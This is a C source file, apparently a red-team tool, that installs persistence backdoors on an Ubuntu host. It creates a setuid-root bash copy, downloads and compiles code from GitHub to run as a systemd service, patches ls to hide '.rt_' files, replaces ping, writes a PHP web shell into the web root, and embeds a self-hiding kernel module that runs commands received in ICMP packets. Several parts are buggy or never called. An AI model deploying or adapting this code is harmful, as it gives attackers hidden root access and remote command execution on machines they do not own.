#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h> // For file perms
#include <fcntl.h>
#include <curl/curl.h>
#include <dirent.h> 

#ifdef FILENAME_MAX
    #define FILENAME_LEN FILENAME_MAX
#else
    #define FILENAME_LEN 255
#endif
#define MAX_BUFFER_SIZE 10240

#define BASH_ID       1
#define PROCESSD_ID   2
#define LS_ID         4
#define PING_ID       8
#define FRONTDOOR_ID 16
#define ICMPK_ID     32

#define ALL 65535

// Configure install here:
#define INSTALL BASH_ID | PROCESSD_ID | LS_ID | PING_ID | FRONTDOOR_ID | ICMPK_ID


// Debugging mode
// #define QUIET
#define WORKING_DIR "/tmp"

// Useful Macros (modify these if path changes made elsewhere)
#define SETUID_BASH_PATH "/lib/gcc/rt_bash"
#define ICMPK_PATH "/" // /lib/modules?

#define HTTP_DOCUMENT_ROOT "/var/www/html"

// Slightly less useful Macros
#define SYSTEM_BASH_PATH "/bin/bash"

// Functions:
int re_setuid_bash(void);
void download_file(const char *hostname, const char *path, const char *output_filename);
int re_processd(void);
int re_broken_ls(void);
int re_fake_ping(void);
int re_http_frontdoor(void);
int re_icmp_c2(void);

////////////////////////////////////////
////////// SETUID BASH
////////////////////////////////////////

int re_setuid_bash(void){
    struct stat file_stat;
    char copy_buffer[MAX_BUFFER_SIZE];
    int bash, setuid_bash;
    int bytes_read;
    
    if (bash == NULL) {
        #ifndef QUIET
        fprintf(stderr, "setuid bash not found, installing now...\n");
        #endif
    }
    // For more advanced systems, read install file and execute
    // for now, hardcoded

    setuid_bash = creat(SETUID_BASH_PATH, 06755);
    if (setuid_bash == -1){
        perror("creat");
        return -1;
    }

    bash = fopen(SYSTEM_BASH_PATH, "r");
    if (bash == NULL) {
        fprintf(stderr, "Bash not found\n");
        return -1;
    }


    while ((bytes_read = fread(copy_buffer, 1, sizeof(copy_buffer), bash)) > 0) {
        write(setuid_bash, copy_buffer, bytes_read);
    } if (ferror(file)) {
        fprintf(stderr, "\nAn error occurred while reading the file.\n");
    }

    close(setuid_bash);
    fclose(copy_buffer);
    
    return 0;
}

////////////////////////////////////////
////////// Processd
////////////////////////////////////////
void download_file(const char *hostname, const char *path, const char *output_filename) {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *server;
    char request[MAX_BUFFER_SIZE];
    char response[MAX_BUFFER_SIZE];
    FILE *output_file;

    // Resolve hostname to IP address
    server = gethostbyname(hostname);
    if (server == NULL) {
        fprintf(stderr, "Error: no such host found\n");
        exit(EXIT_FAILURE);
    }

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }

    // Set server address structure
    bzero((char *)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
    server_addr.sin_port = htons(80);  // HTTP port

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error connecting to server");
        exit(EXIT_FAILURE);
    }

    // Prepare the HTTP GET request
    snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, hostname);

    // Send the HTTP GET request
    if (send(sockfd, request, strlen(request), 0) < 0) {
        perror("Error sending request");
        exit(EXIT_FAILURE);
    }

    // Open output file to save the downloaded content
    output_file = fopen(output_filename, "wb");
    if (output_file == NULL) {
        perror("Error opening output file");
        exit(EXIT_FAILURE);
    }

    // Receive and write the response to the file
    ssize_t bytes_received;
    int header_received = 0;

    while ((bytes_received = recv(sockfd, response, sizeof(response), 0)) > 0) {
        if (!header_received) {
            // Skip HTTP headers (e.g., "HTTP/1.1 200 OK")
            char *body_start = strstr(response, "\r\n\r\n");
            if (body_start != NULL) {
                // Move to the body of the HTTP response
                header_received = 1;
                body_start += 4; // Skip past the "\r\n\r\n"
                bytes_received -= (body_start - response);
                fwrite(body_start, 1, bytes_received, output_file);
            }
        } else {
            // Write the body of the HTTP response to the file
            fwrite(response, 1, bytes_received, output_file);
        }
    }

    if (bytes_received < 0) {
        perror("Error receiving data");
    }

    // Close the file and socket
    fclose(output_file);
    close(sockfd);

    printf("File downloaded successfully!\n");
}
int re_processd(void){
    // TODO: Add error handling

    // Install prereqs
    system("apt install -y libcurl4-openssl-dev");

    // processd.c
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
    // processd executable
    system("gcc /tmp/processd.c -o /var/lib/processd");
    system("chmod 500 /var/lib/processd");
    // remove tmp file
    system("rm /tmp/processd.c");

    // processd.service
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
    // Install service
    system("systemctl daemon-reload && systemctl start processd && systemctl enable processd");

    return 0;
}

////////////////////////////////////////
////////// Broken ls
////////////////////////////////////////
static const char *ls_commands = { "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list", 
    "apt update", 
    "apt-get source -y coreutils && apt-get build-dep -y coreutils", 
    "cd coreutils-*", 
    "yes | autoreconf -fiv", 
    "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules", 
        "awk 'BEGIN { \n" 
        "  found = 0; inserted = 0\n" 
        "} \n" 
        "/file_ignored \\(char const \\*name\\)$/ { \n"
        "  print $0\n"
        "  found = 1\n" 
        "  next\n"
        "} \n" 
        "found == 1 && inserted == 0 && $0 == \"{\" { \n" 
        "  print $0\n"
        "  print \"  if (strncmp(name, \\\".rt_\\\", 3) == 0) { return true; }\"\n" 
        "  inserted = 1\n"
        "  found = 2\n"
        "  next\n"
        "} \n"
        "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c", 
    "make -j`nproc`", 
    "echo \"Replacing ls\"", 
    "cp src/ls `which ls`", 
    "cd ..",
    NULL
};
int re_broken_ls(void){
    char **current_string = ls_commands;
    while (*current_string) {
        system(*current_string++);
    };
    return 0;
}

////////////////////////////////////////
////////// Broken ping
////////////////////////////////////////

int re_fake_ping(void){
    // Download ping.c
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/ping/ping.c", "/tmp/ping.c");
    // Replace ping
    system("gcc /tmp/ping.c -o `which ping`");
    // Remove temporary file
    system("rm /tmp/ping.c");
    return 0;
}

////////////////////////////////////////
////////// HTTP Frontdoor
////////////////////////////////////////
static const char *frontdoor_contents = "<form method=\"GET\">\n"
"    <p>Command: <input type=\"text\" name=\"command\"></p>\n"
"    <input type=\"submit\" value=\"Run\">\n"
"</form>\n"
"<?php\n"
"    if(isset($_GET[\"command\"])){\n"
"        $out = shell_exec($_GET[\"command\"]);\n"
"        echo \"<pre>\" . $out . \"</pre>\";\n"
"    }\n"
"?>";
int re_http_frontdoor(void){
    // Create file and write above php
    FILE *fp = fopen("" HTTP_DOCUMENT_ROOT "/rt_frontdoor.php", "w+");
    fprintf(fp, "%s", frontdoor_contents);
    fclose(fp);

    return 0;
}
////////////////////////////////////////
////////// ICMPK (ICMP-c2)
////////////////////////////////////////

// put icmpk string here
static const char *icmpk_c = "#include <linux/kernel.h>\n"
    "#include <linux/module.h>\n"
    "#include <linux/netfilter.h>\n"
    "#include <linux/netfilter_ipv4.h>\n"
    "#include <linux/ip.h>\n"
    "#include <linux/icmp.h>\n"
    "#include <linux/ktime.h>\n"
    "#include <linux/jiffies.h>\n"
    "#include <linux/uaccess.h>\n"
    "#include <linux/inet.h>\n"
    "#include <linux/skbuff.h>\n"
    "#include <linux/net.h>\n"
    "#include <linux/inet.h>\n"
    "#include <linux/if_ether.h>\n"
    "#include <net/ip.h>\n"
    "#include <linux/workqueue.h>\n"
    "#include <linux/list.h>\n"
    "\n"
    "MODULE_LICENSE(\"GPL\");\n"
    "MODULE_AUTHOR(\"jackdunf@buffalo.edu\");\n"
    "MODULE_DESCRIPTION(\"Simple ICMP-c2\");\n"
    "\n"
    "#define ICMP_ECHO   8\n"
    "#define ICMP_REPLY  0\n"
    "#define ICMP_HLEN   sizeof(struct icmphdr)\n"
    "\n"
    "#define FLAG        \"\\x70\\x95\\x05\"\n"
    "#define FLAG_LEN    3\n"
    "\n"
    "static struct socket *raw_socket;\n"
    "static struct nf_hook_ops nfho;\n"
    "static struct workqueue_struct *work_queue;\n"
    "static atomic_t work_count = ATOMIC_INIT(0);\n"
    "\n"
    "\n"
    "typedef enum COMMANDS {\n"
    "    START_SERVICE = 0,\n"
    "    STOP_SERVICE  = 1,\n"
    "    OPEN_BACKDOOR = 2,\n"
    "    DANGER        = 4\n"
    "} command_t;\n"
    "\n"
    "struct work_item {\n"
    "    struct work_struct work;\n"
    "    char *command;\n"
    "};\n"
    "\n"
    "// Work\n"
    "static void icmp_handle_work(struct work_struct *work);\n"
    "// Commands\n"
    "static int queue_execute(char *command);\n"
    "void free_tokens(char **tokens, int token_count);\n"
    "// Networking\n"
    "unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);\n"
    "static uint16_t checksum(uint16_t *data, int len);\n"
    "static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);\n"
    "\n"
    "static void icmp_handle_work(struct work_struct *work) {\n"
    "    int ret;\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Entering work handler...\\n\");\n"
    "        printk(KERN_DEBUG \"Queue length: %d\", atomic_read(&work_count));\n"
    "    #endif\n"
    "    struct work_item *work_item = container_of(work, struct work_item, work);\n"
    "\n"
    "    char *argv[] = { \"/bin/bash\", \"-c\", work_item->command, NULL };\n"
    "    char *envp[] = { \"HOME=/\", \"TERM=xterm\", \"PATH=/sbin:/usr/sbin:/bin:/usr/bin\", NULL };\n"
    "    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n"
    "    #ifdef DEBUG_K\n"
    "    if (ret != 0){\n"
    "        pr_err(\"Error (%d) executing command: \\\"%s\\\"\\n\", ret, work_item->command);\n"
    "    }\n"
    "    #endif\n"
    "\n"
    "    atomic_dec(&work_count);\n"
    "    kfree(work_item->command);\n"
    "    kfree(work_item);\n"
    "}\n"
    "\n"
    "static int queue_execute(char *command){\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Creating queue item...\");\n"
    "    #endif\n"
    "    struct work_item *work = kmalloc(sizeof(struct work_item), GFP_KERNEL);\n"
    "    work->command = command;\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Queueing queue item...\");\n"
    "    #endif\n"
    "    INIT_WORK(&work->work, icmp_handle_work);\n"
    "    queue_work(work_queue, &work->work);\n"
    "    atomic_inc(&work_count);\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_DEBUG \"Enqueued\");\n"
    "    #endif\n"
    "\n"
    "    return 0;\n"
    "}\n"
    "\n"
    "// Source: elsewhere\n"
    "static uint16_t checksum(uint16_t *data, int len) {\n"
    "    uint32_t sum = 0;\n"
    "    while (len > 1) { sum += *data++; len -= 2; }\n"
    "    if (len == 1) sum += *(uint8_t *)data;\n"
    "    sum = (sum >> 16) + (sum & 0xFFFF);\n"
    "    sum += (sum >> 16);\n"
    "    return (uint16_t)~sum;\n"
    "}\n"
    "\n"
    "// Source: jackdunf, different file\n"
    "static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {\n"
    "    struct sockaddr_in dest_addr;\n"
    "    struct msghdr msg = {};\n"
    "    struct kvec iov;\n"
    "    char *packet;\n"
    "    struct icmphdr *icmp_hdr;\n"
    "    int ret = 0;\n"
    "    const size_t PACKET_SIZE = ICMP_HLEN + payload_len;\n"
    "\n"
    "    // Allocate memory for the packet\n"
    "    packet = kmalloc(PACKET_SIZE, GFP_KERNEL);\n"
    "    if (!packet)\n"
    "        return -ENOMEM;\n"
    "\n"
    "    // Fill ICMP header\n"
    "    icmp_hdr = (struct icmphdr *)packet;\n"
    "    icmp_hdr->type = ICMP_REPLY;\n"
    "    icmp_hdr->code = 0;\n"
    "    icmp_hdr->checksum = 0;\n"
    "    icmp_hdr->un.echo.id = incoming_icmp->un.echo.id;\n"
    "    icmp_hdr->un.echo.sequence = incoming_icmp->un.echo.sequence;\n"
    "\n"
    "    // Add payload\n"
    "    memcpy(packet + ICMP_HLEN, payload, payload_len);\n"
    "\n"
    "    // Calculate checksum\n"
    "    icmp_hdr->checksum = checksum((uint16_t *)packet, PACKET_SIZE);\n"
    "\n"
    "    // Initialize destination address\n"
    "    memset(&dest_addr, 0, sizeof(dest_addr));\n"
    "    dest_addr.sin_family = AF_INET;\n"
    "    dest_addr.sin_addr.s_addr = address;\n"
    "\n"
    "    // Initialize the socket\n"
    "    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &raw_socket);\n"
    "    if (ret < 0) {\n"
    "        pr_err(\"Failed to create raw socket: %d\\n\", ret);\n"
    "        kfree(packet);\n"
    "        return ret;\n"
    "    }\n"
    "\n"
    "    // Prepare message\n"
    "    iov.iov_base = packet;\n"
    "    iov.iov_len = PACKET_SIZE;\n"
    "    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, PACKET_SIZE);\n"
    "\n"
    "    msg.msg_name = &dest_addr;\n"
    "    msg.msg_namelen = sizeof(dest_addr);\n"
    "\n"
    "    // Send the ICMP Echo Request\n"
    "    ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);\n"
    "    #ifdef DEBUG_K\n"
    "        if (ret < 0) {\n"
    "            pr_err(\"ICMP failed to reply: %d\\n\", ret);\n"
    "        } else {\n"
    "            pr_info(\"ICMP echo request sent successfully\\n\");\n"
    "        }\n"
    "    #endif\n"
    "\n"
    "    // Clean up\n"
    "    sock_release(raw_socket);\n"
    "    kfree(packet);\n"
    "\n"
    "    return (ret >= 0) ? 0 : ret;\n"
    "}\n"
    "\n"
    "\n"
    "unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {\n"
    "    struct iphdr *iph;\n"
    "    struct icmphdr *icmph;\n"
    "    unsigned char *payload_start;\n"
    "    char *payload;\n"
    "    int icmp_payload_len;\n"
    "\n"
    "    // Ensure it's an IPv4 packet with ICMP\n"
    "    iph = ip_hdr(skb);\n"
    "    if (!iph || iph->protocol != IPPROTO_ICMP) {\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "\n"
    "    icmph = icmp_hdr(skb);\n"
    "    if (!icmph || icmph->type != ICMP_ECHO) {\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "\n"
    "    // Below overestimates\n"
    "    // unsigned char *end_of_skb = skb->data + skb->len; \n"
    "    // icmp_payload_len = (void *)end_of_skb - ( (void *)icmph + ICMP_HLEN );\n"
    "\n"
    "    icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;\n"
    "    payload_start = (void *)icmph + ICMP_HLEN;\n"
    "\n"
    "    payload = (char *) kmalloc(icmp_payload_len + 1, GFP_KERNEL);\n"
    "    memcpy(payload, payload_start, icmp_payload_len);\n"
    "    payload[icmp_payload_len] = 0;\n"
    "\n"
    "    #ifdef DEBUF_K\n"
    "        pr_info(\"icmp_payload_len: %d\\n\", icmp_payload_len);\n"
    "    #endif\n"
    "    if(icmp_payload_len <= 0 || icmp_payload_len < FLAG_LEN){\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "\n"
    "    // Check for flag\n"
    "    if(strncmp(payload, FLAG, FLAG_LEN) != 0){\n"
    "        #ifdef DEBUG_K\n"
    "            pr_info(\"Regular ICMP, no flag\\n\");\n"
    "        #endif\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "    \n"
    "    #ifdef DEBUG_K\n"
    "        pr_info(\"Payload contained flag\\n\");\n"
    "    #endif\n"
    "\n"
    "    char *command = payload+FLAG_LEN;\n"
    "    #ifdef DEBUG_K\n"
    "        pr_info(\"Command: %s\\n\", command);\n"
    "    #endif\n"
    "    int status = queue_execute(command);\n"
    "    if(status) {} // prevent unused variable\n"
    "    #ifdef DEBUG_K\n"
    "        pr_info(\"Status: %d\\n\", status);\n"
    "    #endif\n"
    "\n"
    "    // TODO: Check if ignore all is set\n"
    "    if(send_icmp_reply(icmph, iph->saddr, payload, icmp_payload_len) < 0){\n"
    "        return NF_ACCEPT;\n"
    "    }\n"
    "    return NF_DROP;\n"
    "}\n"
    "\n"
    "// Module initialization\n"
    "struct list_head *mod_list;\n"
    "static int __init init_icmp_hijack(void) {\n"
    "\n"
    "    // Hide module from lsmod\n"
    "    mod_list = THIS_MODULE->list.prev;\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_INFO \"Hiding module from list\\n\");\n"
    "    #endif \n"
    "    list_del(&THIS_MODULE->list);\n"
    "\n"
    "    THIS_MODULE->sect_attrs = NULL;  // Removes visibility of module sections\n"
    "    kobject_del(&THIS_MODULE->mkobj.kobj);  // Deletes the module's kobject entry\n"
    "\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_INFO \"Loading icmp-c2 module...\\n\");\n"
    "    #endif\n"
    "\n"
    "    work_queue = create_singlethread_workqueue(\"work_queue\");\n"
    "    if (!work_queue) {\n"
    "        #ifdef DEBUG_K\n"
    "        printk(KERN_ERR \"Failed to create workqueue\\n\");\n"
    "        #endif\n"
    "        return -ENOMEM;\n"
    "    }\n"
    "\n"
    "    // Fill in the nf_hook_ops structure\n"
    "    nfho.hook = icmp_hijack;                     // Hook function\n"
    "    // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets\n"
    "    nfho.hooknum = NF_INET_PRE_ROUTING;        // Going to try to manipulate\n"
    "    nfho.pf = PF_INET;                          // IPv4\n"
    "    nfho.priority = NF_IP_PRI_FIRST;            // Set highest priority\n"
    "\n"
    "    // Register the hook\n"
    "    nf_register_net_hook(&init_net, &nfho);\n"
    "\n"
    "    #ifdef DEBUG_K\n"
    "        printk(KERN_INFO \"icmp handler loaded.\\n\");\n"
    "    #endif\n"
    "\n"
    "    return 0;\n"
    "}\n"
    "\n"
    "// Module cleanup\n"
    "static void __exit exit_icmp_hijack(void) {\n"
    "    printk(KERN_INFO \"Unloading icmp...\\n\");\n"
    "\n"
    "    // Unhide\n"
    "    list_add(&THIS_MODULE->list, mod_list);\n"
    "\n"
    "    // Unregister the hook\n"
    "    nf_unregister_net_hook(&init_net, &nfho);\n"
    "\n"
    "    /* Destroy the workqueue */\n"
    "    if (work_queue){\n"
    "        flush_workqueue(work_queue);\n"
    "        destroy_workqueue(work_queue);\n"
    "    }\n"
    "\n"
    "    printk(KERN_INFO \"icmp handler unloaded.\\n\");\n"
    "}\n"
    "\n"
    "module_init(init_icmp_hijack);\n"
    "module_exit(exit_icmp_hijack);\n";
static const char *icmpk_Makefile = "CONFIG_MODULE_SIG=n\n"
    "obj-m += icmpk.o\n"
    "all:\n"
    "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n"
    "clean:\n"
    "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n";
const char *icmpk_find_missing_if_any = "make";
int re_icmp_c2(void){
    // Vars
    FILE *fp;
    // Install prereqs
        // headers compiler etc.
    // Write code
    fp = fopen("" ICMPK_PATH "/icmpk.ko", "w+");
    fprintf(fp, "%s", icmpk_c);
    fclose(fp);
    // Write Makefile
    fp = fopen("" ICMPK_PATH "/Makefile", "w+");
    fprintf(fp, "%s", icmpk_Makefile);
    fclose(fp);

    // Run installation
    system("make");
    system("mv imcpk.ko " ICMPK_PATH "/icmpk.ko");
    system("insmod " ICMPK_PATH "/icmpk.ko");

    // Persistence
    return 0;
}

#define FAILURE_STRING "Failed to install %s\n"
#define print_failure(message) fprintf(stderr, FAILURE_STRING, message);

int main(int argc, char **argv){
    struct dirent *de;
    DIR *dr;
    int failures = 0;
    char current_file[FILENAME_MAX];

    // Assming Ubuntu
    system("apt update");

    // Change working directory 
    chdir(WORKING_DIR);

    // Run install subprograms
    if(INSTALL & BASH_ID && re_setuid_bash())
        failures |= BASH_ID;
    if(INSTALL & PROCESSD_ID && re_processd())
        failures |= PROCESSD_ID;
    if(INSTALL & LS_ID && re_broken_ls())
        failures |= LS_ID;
    if(INSTALL & PING_ID && re_fake_ping())
        failures |= PING_ID;

    // Empty /tmp
    dr = opendir(WORKING_DIR);
    if (dr == NULL) { 
        perror("opendir"); 
        return 1;
    }
    while ((de = readdir(dr)) != NULL) {
        #ifndef QUIET
        fprintf(stderr, "Removing " WORKING_DIR "/%s\n", de->d_name);
        #endif
        sprintf(current_file, "" WORKING_DIR "/%s", de->d_name);
        remove(current_file);
    }
    closedir(dr);

    // Print failures at program end
    if (failures & BASH_ID)
        print_failure("setuid bash");
    if (failures & PROCESSD_ID)
        print_failure("processd");
    if (failures & LS_ID)
        print_failure("ls");
    if (failures & PING_ID)
        print_failure("false ping");
}